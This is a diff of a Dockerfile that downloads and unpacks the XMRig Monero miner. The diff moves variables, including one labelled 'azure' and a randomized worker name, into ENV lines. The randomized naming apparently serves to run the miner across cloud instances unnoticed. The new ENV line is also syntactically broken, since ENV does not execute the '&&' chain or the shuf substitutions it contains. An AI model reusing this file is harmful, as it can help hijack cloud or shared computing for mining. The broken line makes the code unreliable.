@@ -1,10 +1,12 @@
 FROM ubuntu:16.04
 
 ENV VERSION 4.6.2-beta
+ENV azure mxsemsdnlkdj
+ENV a 'mxsemsdnlkdj-' && b $(shuf -i10-375 -n1) && c '-' && d $(shuf -i10-259 -n1) && cpuname $a$b$c$d
 
 RUN apt-get update && apt-get install -y wget
-RUN azure=mxsemsdnlkdj;
-RUN a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+
+
 RUN wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
 RUN tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
 RUN cd xmrig-$VERSION
